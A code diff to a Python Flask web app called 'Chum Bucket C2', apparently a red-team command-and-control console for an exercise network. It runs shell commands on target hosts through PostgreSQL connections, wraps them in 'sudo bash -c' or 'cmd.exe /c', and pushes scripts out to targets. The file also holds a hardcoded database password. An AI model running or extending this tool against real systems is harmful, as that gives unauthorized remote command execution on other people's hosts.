@@ -1,9 +1,4 @@
 #!/usr/bin/env python3
-"""
-Chum Bucket C2 - Red Team Command & Control
-Browser-based interface for monitoring service
-"""
-
 from flask import Flask, render_template_string, request, jsonify
 import psycopg2
 import threading
@@ -19,11 +14,6 @@ def localhost_only():
         from flask import abort
         abort(403)
 
-# -------------------------------------------------------
-# Target configuration
-# os: "linux" uses sudo bash -c wrapper
-# os: "windows" uses cmd.exe /c wrapper
-# -------------------------------------------------------
 TARGETS = {
     # Linux - 10.111.1.x
     "shellphone":    {"ip": "10.111.1.1", "service": "SMB",                   "os": "linux"},
@@ -46,18 +36,10 @@ PG_PASSWORD = "M0n1t0r$vc!"
 
 SCRIPTS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "scripts")
 
-# -------------------------------------------------------
-# Per-host terminal state (single operator, no sessions needed)
-# -------------------------------------------------------
-# cwd per host name
 terminal_cwd = {}
-# scrollback per host: list of {"prompt": str, "output": str, "error": bool}
 terminal_history = {}
 terminal_lock = threading.Lock()
 
-# -------------------------------------------------------
-# HTML Template
-# -------------------------------------------------------
 HTML = r"""
 <!DOCTYPE html>
 <html lang="en">
@@ -882,9 +864,6 @@ setInterval(pingAll, 15000);
 </html>
 """
 
-# -------------------------------------------------------
-# PostgreSQL helpers
-# -------------------------------------------------------
 
 def get_conn(ip):
     return psycopg2.connect(
@@ -930,11 +909,9 @@ def run_command(ip, command, target_os="linux"):
 def run_command_with_cwd(ip, command, target_os, cwd):
     """Run command prefixed with cd to tracked cwd, then capture new cwd."""
     if target_os == "windows":
-        # Rewrite bare 'cd <path>' to 'cd /d <path>' so drive changes work
         cd_rewrite = re.match(r'^cd\s+(?!/d\s)(.+)$', command, re.IGNORECASE)
         if cd_rewrite:
             command = f'cd /d {cd_rewrite.group(1)}'
-        # Use cd /d to capture cwd; no prefix when cwd unknown
         if not cwd or cwd == "~":
             full_cmd = f'{command} && cd'
         else:
@@ -952,13 +929,11 @@ def run_command_with_cwd(ip, command, target_os, cwd):
     if target_os == "windows":
         lines = output.strip().splitlines()
         last = lines[-1].strip() if lines else ""
-        # Valid Windows path starts with a drive letter e.g. C:\
         new_cwd = last if (len(last) >= 3 and last[1:3] == ":\\") else cwd
         display_output = "\n".join(lines[:-1]).strip() if len(lines) > 1 else "(no output)"
     else:
         lines = output.strip().splitlines()
         last = lines[-1].strip() if lines else ""
-        # Valid Linux path starts with /
         new_cwd = last if last.startswith("/") else cwd
         display_output = "\n".join(lines[:-1]).strip() if len(lines) > 1 else "(no output)"
 
@@ -1001,9 +976,6 @@ def load_scripts():
     return result
 
 
-# -------------------------------------------------------
-# Routes
-# -------------------------------------------------------
 
 @app.route('/')
 def index():
@@ -1093,15 +1065,17 @@ def deploy():
         })
 
     ip = TARGETS[target_name]['ip']
-    output, error = run_command(ip, script['content'], target_os)
+    lines = [l for l in script['content'].splitlines()
+             if l.strip()
+             and not l.strip().upper().startswith('REM ')
+             and not l.strip().startswith('#')]
+    cmd = ' & '.join(lines) if target_os == 'windows' else '\n'.join(lines)
+    output, error = run_command(ip, cmd, target_os)
     if error:
         return jsonify({'output': f'Error: {error}', 'status': 'err'})
     return jsonify({'output': output, 'status': 'ok'})
 
 
-# -------------------------------------------------------
-# Entry point
-# -------------------------------------------------------
 if __name__ == '__main__':
     print(f"Chum Bucket C2 starting on http://127.0.0.1:9000 (localhost only)")
     print(f"Scripts directory: {SCRIPTS_DIR}")
